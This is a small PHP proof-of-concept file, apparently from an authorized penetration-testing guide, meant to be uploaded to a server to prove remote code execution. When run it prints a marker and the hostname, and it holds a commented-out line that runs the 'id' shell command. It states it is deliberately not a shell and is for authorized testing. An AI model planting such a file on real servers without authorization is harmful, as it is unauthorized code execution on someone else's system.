<?php
// BENIGN RCE PROOF — authorized testing only (guide §12, §26).
// If this file executes server-side, it prints a unique marker + hostname, which PROVES
// remote code execution. It is intentionally NOT an interactive shell.
// Replace the marker with your handle. Delete the uploaded file after the PoC.
echo "RCE-POC-" . md5("yourhandle-unique-2026") . "-" . php_uname("n");
// (Optional single read-only proof, uncomment ONLY if you need a command marker and it's in scope:)
// echo " | uid=" . trim(@shell_exec("id"));
?>
